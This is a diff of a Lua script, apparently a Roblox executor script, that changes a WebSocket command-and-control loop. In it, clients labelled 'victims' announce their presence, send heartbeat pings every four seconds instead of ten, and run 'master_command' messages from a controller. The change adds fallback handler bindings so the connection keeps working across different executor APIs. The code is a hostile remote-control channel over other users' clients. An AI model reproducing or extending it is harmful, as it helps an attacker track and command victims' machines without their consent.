@@ -378,7 +378,7 @@ task.spawn(function()
             local function onMsg(raw)
                 local s, data = pcall(function() return HttpService:JSONDecode(raw) end)
                 if s and data then
-                    if data.type == "ping_victims" then
+                    if data.type == "ping_victims" or data.type == "ping" then
                         sendPresence("victim_joined")
                     elseif data.type == "master_command" then
                         task.spawn(function()
@@ -389,16 +389,21 @@ task.spawn(function()
             end
 
             pcall(function() ws.OnMessage:Connect(onMsg) end)
+            pcall(function() ws.OnMessage:connect(onMsg) end)
+            pcall(function() ws.onmessage = onMsg end)
+            pcall(function() ws.OnMessage = onMsg end)
 
             local isClosed = false
-            pcall(function()
-                ws.OnClose:Connect(function()
-                    isClosed = true
-                end)
-            end)
+            local function onCloseHandler()
+                isClosed = true
+            end
+            pcall(function() ws.OnClose:Connect(onCloseHandler) end)
+            pcall(function() ws.OnClose:connect(onCloseHandler) end)
+            pcall(function() ws.onclose = onCloseHandler end)
+            pcall(function() ws.OnClose = onCloseHandler end)
 
             while not isClosed and _G.SacredVictimWS == ws and _G.SacredVictimSessionId == mySessionId do
-                task.wait(10)
+                task.wait(4)
                 sendPresence("victim_ping")
             end
         end
